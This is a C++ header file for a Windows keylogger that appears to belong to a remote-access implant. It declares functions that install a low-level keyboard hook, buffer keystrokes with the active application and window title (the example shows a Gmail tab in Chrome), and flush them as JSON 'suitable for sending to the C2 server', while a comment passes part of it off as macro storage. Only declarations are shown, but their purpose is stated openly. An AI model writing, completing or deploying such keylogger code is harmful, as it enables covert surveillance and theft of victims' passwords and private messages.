#ifndef KEYBOARD_H
#define KEYBOARD_H

#include <windows.h>
#include <string>

/**
 * Initialises macro storage (legacy compat — no-op with in-memory buffer).
 */
BOOL InitMacroStorage();

/**
 * Installs the low-level keyboard hook and starts buffering keystrokes.
 * @param logPath  Optional file path for legacy file logging (pass "" to skip)
 */
BOOL StartKeyboardHook(const char* logPath);

/**
 * Removes the keyboard hook and clears the in-memory buffer.
 */
void StopKeyboardHook();

/**
 * Drains the in-memory keystroke buffer and returns a JSON array string
 * suitable for sending to the C2 server.
 * Format: [{"key":"h","app":"chrome.exe","win":"Gmail - Chrome","ts":12345}, ...]
 * Returns "" if nothing has been captured since the last flush.
 */
std::string FlushKeylogs();

#endif // KEYBOARD_H